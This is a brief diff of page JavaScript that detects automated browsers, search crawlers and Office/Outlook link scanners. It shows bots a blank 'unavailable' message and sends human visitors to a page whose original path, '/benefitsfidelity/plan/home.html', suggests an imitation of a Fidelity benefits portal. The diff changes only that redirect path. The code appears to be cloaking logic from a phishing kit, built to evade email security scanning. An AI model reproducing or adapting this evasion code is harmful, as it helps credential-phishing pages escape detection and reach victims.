@@ -11,7 +11,7 @@
         const isBot = navigator.webdriver || 
                       /HeadlessChrome|Googlebot|Bingbot|Slurp|DuckDuckBot|Baiduspider|Office|Outlook/i.test(navigator.userAgent);
         if (!isBot) {
-            window.location.replace("/benefitsfidelity/plan/home.html");
+            window.location.replace("home.html");
         } else {
             document.body.innerHTML = "<p>This page is currently unavailable.</p>";
         }
